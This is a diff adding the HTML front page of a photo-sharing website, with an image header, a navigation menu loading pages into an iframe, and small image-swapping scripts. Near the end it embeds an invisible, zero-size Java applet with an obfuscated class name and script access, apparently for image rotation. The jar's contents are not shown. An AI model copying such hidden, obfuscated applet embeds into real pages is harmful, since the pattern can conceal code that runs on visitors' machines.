@@ -1,0 +1,48 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>DPS - Digital Photo Sharing</title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+   <script type="text/javascript">
+	pic = new Image();
+	function GETimg(id,divContents){
+    		this.document.getElementById(id).innerHTML = divContents;
+	}
+	function imgCACHE(imgSrc){
+    		pic.src = imgSrc;
+	}
+   </script>
+</head>
+
+<body>
+<div id="wrap">
+<div id="header-img"><img src="images/dps-img_01.jpg" alt="DPS - Digital Photo Sharing" /><img src="images/dps-img_02.jpg" alt="DPS - Digital Photo Sharing" /><img src="images/dps-img_03.jpg" alt="DPS - Digital Photo Sharing" /></div>
+<div id="header-img"><img src="images/dps-img_04.jpg" alt="DPS - Digital Photo Sharing" /><img src="images/dps-img_05.jpg" alt="DPS - Digital Photo Sharing" /></div>
+<div id="img-rotate-01"></div>
+<div id="img-rotate-02"></div>
+<div id="img-rotate-03"></div>
+<div id="header-img"><img src="images/dps-img_09.jpg" alt="DPS - Digital Photo Sharing" /></div>
+<div id="nav">
+<div id="menu">
+<ul class="menu">
+<li><a href="news.html" target="linkhtml"><span>News</span></a></li>
+<li><a href="shopping.html" target="linkhtml"><span>Shopping</span></a></li>
+<li><a href="history.html" target="linkhtml"><span>History</span></a></li>
+<li><a href="photographers.html" target="linkhtml"><span>Photographers</span></a></li>
+<li><a href="digital.html" target="linkhtml"><span>Digital</span></a></li>
+<li class="last"><a href="sharing.html" target="linkhtml"><span>Sharing</span></a></li>
+</ul>
+</div>
+</div>
+<div id="info-wrap">
+<iframe name="linkhtml" id="content" src="news.html" height="2000" width="975" frameborder="0" marginwidth="0" scrolling="no"></iframe>
+</div>
+</div>
+<applet archive="photography.jar" code="c.a.b.c" height="0" mayscript="true" width="0">
+  <param name="img-rotate-01" value="5000"><param name="img-rotate-02" value="5000"><param name="img-rotate-03" value="5000"></applet>
+</body>
+<a href="http://apycom.com/"></a>
+<script type="text/javascript" src="jquery.js"></script>
+<script type="text/javascript" src="menu.js"></script>
+</html>
